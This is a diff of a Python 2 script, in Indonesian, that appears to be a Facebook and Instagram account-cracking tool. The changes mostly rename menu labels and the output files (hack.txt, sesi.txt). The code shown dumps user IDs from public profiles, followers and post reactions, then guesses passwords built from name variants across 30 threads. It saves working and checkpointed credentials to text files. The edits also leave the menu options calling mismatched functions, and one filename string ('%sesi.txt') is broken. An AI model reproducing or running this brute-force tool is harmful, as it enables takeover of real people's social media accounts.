@@ -248,17 +248,17 @@ class ngentod:
                             os.remove(self.apk);exit()
                         else:
                             print ('\n %s[!] isi yang benar kentod'%(M));zona()
-                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+            print '\n%s [ Pilih Login Crack ]\n'%(P)
+            print ' [%s01%s] Login Lewat Api (Cepat)'%(O,P)
+            print ' [%s02%s] Login Lewat Mbasic (Sedang)'%(O,P)
+            print ' [%s03%s] Login Lewat Mobile (Lambat) '%(O,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
-            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-            print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+            print '\n%s [ Pilih Login Crack ]\n'%(P)
+            print ' [%s01%s] Login Lewat Api (Cepat)'%(O,P)
+            print ' [%s02%s] Login Lewat Mbasic (Sedang)'%(O,P)
+            print ' [%s03%s] Login Lewat Mobile (Lambat) '%(O,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -527,17 +527,17 @@ def crack2(user, pwx):
 				# print ("\r",data)
 				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
 				if "checkpoint_url" in str(data):
-					cepeh = "Checkpoint"
-					ingfo(user, pw, cepeh)
-					with open("cepeh.txt", "a") as simpan:
+					sesi = "Checkpoint"
+					ingfo(user, pw, sesi)
+					with open("sesi.txt", "a") as simpan:
 						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
 					cp.append(user)
 					break
 				elif "userId" in str(data):
-					okeh = "Berhasil"
+					hack = "Berhasil"
 					if len(status_foll) != 1:
-						ingfo(user, pw, okeh)
-						with open("okeh.txt", "a")as simpan:
+						ingfo(user, pw, hack)
+						with open("hack.txt", "a")as simpan:
 							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
 						ok.append(user)
 						#follow(ses,user)
@@ -617,36 +617,36 @@ def menu():
     except requests.exceptions.ConnectionError:
         exit("%s [!] Kesalahan koneksi "%(M))
     banner()
-    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
-    print (' [%s01%s] Dump id public'%(K,P)) 
-    print (' [%s02%s] Dump id followers'%(K,P)) 
-    print (' [%s03%s] Dump id reaction post'%(K,P))
-    print (' [%s04%s] Crack cari nama (instagram) '%(K,P))
-    print (' [%s05%s] %sStart crack %s'%(K,P,H,P)) 
-    print (' [%s06%s] Setting user agent'%(K,P)) 
-    print (' [%s07%s] Cek hasil crack'%(K,P)) 
-    #print (' [%s08%s] Gabung group'%(K,P))
-    #print (' [%s09%s] Info script'%(K,P))
-    print (' [%s00%s] Hapus token '%(M,P))
-    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
+    print ('\n %s[ Akulah %s%s%s ] \n'%(P,K,nama,P))
+    print (' (%s01%s) Instagram Crack Nama'%(O,P)) 
+    print (' (%s02%s) Facebook Crack Publik'%(O,P)) 
+    print (' (%s03%s) Facebook Crack Follow'%(O,P))
+    print (' (%s04%s) Facebook Crack Postingan '%(O,P))
+    print (' (%s05%s) %sMemulai Operasi Crack %s'%(O,P,M,P)) 
+    print (' (%s06%s) User agent'%(O,U)) 
+    print (' (%s07%s) Cek Pendapatan Akun'%(H,O)) 
+    #print (' (%s08%s) Gabung group'%(O,P))
+    #print (' (%s09%s) Info script'%(O,P))
+    print (' (%s00%s) Log Out '%(P,M))
+    unik = raw_input('\n%s [!] Menu : %s'%(P,O))
     if unik == '':
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
+        print("%s [!] Isilah Dengan Cinta "%(M));jeda(2);menu()
     elif unik in['1','01']:
-        publik(romz)
+        igg(romz)
     elif unik in['2','02']:
-        followers(romz)
+        public(romz)
     elif unik in['3','03']:
-        postingan(romz)
+        followers(romz)
     elif unik in['4','04']:
-    	igg()
+    	postingan()
     elif unik in['5','05']:
         ngentod().romiy()
     elif unik in['6','06']:
     	useragent()
     elif unik in['7','07']:
-    	print "\n%s [01] Hasil crack akun facebook "%(P)
-        print "%s [02] Hasil crack akun instagram "%(P)
-        c = raw_input('\n%s [?] Menu : %s'%(P,K))
+    	print "\n%s [01] Pendapatan Facebook "%(P)
+        print "%s [02] Pendapatan Instagram "%(P)
+        c = raw_input('\n%s [?] Menu : %s'%(P,O))
     	hasill(c)
     elif unik in['8','08']:
         os.system("xdg-open https://www.facebook.com/groups/924679595149360")
@@ -692,22 +692,22 @@ def hasill(c):
         	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
 		if rom in['1','01']:
 			try:
-				oke = open("okeh.txt", "r").readlines()
+				oke = open("hack.txt", "r").readlines()
 				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-				jalan(" [%s*%s] total akun : %s%s"%(K,P,H,str(len(oke))))
+				jalan(" [%s*%s] total akun : %s%s"%(O,P,H,str(len(oke))))
 				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
-				okek = open("okeh.txt", "r").read()
+				okek = open("hack.txt", "r").read()
 				print (okek)
 				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
 			except IOError,KeyError:
 				exit (M+"\n [!] tidak ada hasil awokawokawok")
 		elif rom in['2','02']:
 			try:
-				cepe = open("cepeh.txt", "r").readlines()
+				cepe = open("sesi.txt", "r").readlines()
 				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-				jalan(" [%s*%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
+				jalan(" [%s*%s] total akun : %s%s"%(O,P,O,str(len(cepe))))
 				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
-				cepek = open("cepeh.txt", "r").read()
+				cepek = open("sesi.txt", "r").read()
 				print (cepek)
 				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
 			except IOError,KeyError:
@@ -726,8 +726,8 @@ def igg():
 		mi.append(bff_2+str(_i_)+"|"+bff_2)
 		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
 		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
-	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
-	print '%s [%s*%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
+	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hack.txt'%(P,K,P,H,P,H);jeda(0.2)
+	print '%s [%s*%s] akun %sCP %stersimpan di > %sesi.txt\n'%(P,K,P,K,P,K);jeda(0.2)
 	with ThreadPoolExecutor(max_workers=30) as log:
 		for ro in mi:
 			try:
